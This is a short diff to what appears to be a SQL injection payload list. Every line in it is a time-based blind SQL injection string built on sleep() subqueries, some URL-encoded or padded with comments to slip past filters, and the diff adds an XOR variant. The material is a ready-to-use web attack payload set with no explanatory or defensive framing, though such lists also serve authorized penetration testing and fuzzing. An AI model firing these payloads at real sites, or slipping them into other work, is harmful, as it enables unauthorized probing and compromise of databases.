@@ -97,6 +97,7 @@ latest:
 1%27/**/%256fR/**/50%2521%253D%253B%2523
 '+(select*from(select(sleep(20)))a)+'
 
-'+(select*from(select(sleep(7)))a)+'
 
+'+(select*from(select(sleep(7)))a)+'
+'XOR(select*from(select(sleep(7)))a)XOR'Z--%20-+
 'and+(select*from(select(sleep(4)))a)+--+
